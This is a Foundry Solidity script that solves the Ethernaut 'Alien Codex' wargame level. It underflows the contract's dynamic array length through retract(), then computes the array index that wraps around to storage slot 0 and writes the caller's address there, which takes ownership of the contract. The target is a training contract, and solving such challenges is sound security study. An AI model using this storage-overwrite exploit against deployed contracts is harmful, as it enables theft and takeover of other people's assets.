// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IAlienCodex } from "ethernaut/19-alien-codex/IAlienCodex.sol";

contract AlienCodexScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address alienCodexAddr = vm.envAddress("L19_ALIEN_CODEX_ADDRESS");
        IAlienCodex alienCodex = IAlienCodex(alienCodexAddr);

        // Step 1: make contact (required to pass contacted() modifier)
        alienCodex.make_contact();

        // Step 2: decrement length by 1 (stored in slot 1), which sets it 2^256 intead of 0
        // Storage
        // slot 0: owner & contact
        // slot 1: codex.length
        alienCodex.retract();

        // Step 3: insert msgSender address at slot 0, (2^256 - p + 1)
        uint256 codexIdx = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        alienCodex.revise(codexIdx, bytes32(uint256(uint160(vm.addr(deployerPrivateKey)))));

        vm.stopBroadcast();
    }
}
